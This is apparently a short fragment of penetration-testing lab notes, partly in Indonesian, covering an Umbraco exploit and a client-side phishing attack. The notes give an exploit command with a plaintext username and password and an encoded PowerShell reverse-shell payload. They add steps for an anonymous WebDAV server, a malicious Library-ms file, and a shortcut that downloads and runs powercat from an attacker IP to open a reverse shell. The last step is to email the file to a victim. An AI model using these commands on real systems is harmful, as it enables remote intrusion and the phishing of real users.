...
umbraco reverse shell

```
python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c powershell.exe -a '-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwB'
```


##### Client side attack

Nyalakan webdav server 

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/webdav/
```

save xml ini dengan nama config.Library-ms :
```
...
lalu buat desktop shortcut powershell dengan klik kanan dan isi 
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```

lalu pindah ke share webdav pada attacker machine. dan kirim email pada korban dengan config.Library-ms
